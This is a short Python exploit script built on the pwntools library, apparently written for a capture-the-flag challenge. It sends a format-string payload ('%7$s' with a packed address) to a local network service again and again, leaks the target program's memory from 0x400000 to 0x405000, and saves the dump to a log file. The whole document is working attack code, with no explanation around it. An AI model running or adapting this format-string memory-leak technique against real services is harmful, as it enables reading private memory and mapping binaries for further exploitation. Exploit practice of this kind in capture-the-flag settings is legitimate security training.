from tqdm import tqdm

def leak(addr):
    sleep(0.02)
    p = remote('0.0.0.0',10108)
    # p=process('./leaking')

    payload = "%7$s|$$\x00" + p64(addr)
    p.sendline(payload)
    data = p.recvuntil("|$$")[:-3]
    p.close()
    return data

pos = 0x400000
end = 0x405000    
pbar = tqdm(total = end-pos, desc="leaking")

with open("log.txt", 'w') as f:
    from pwn import *
    context.log_level = 'CRITICAL'
    # context.log_level = 'debug'

    while pos < end:
        try:
            data = leak(pos)
            pos += len(data)
            pos += 1
            pbar.update(len(data)+1)
            f.write(data+'\0')
        except:
            print('sleep 15s')
            sleep(15)

# print enhex(leak(0x400000))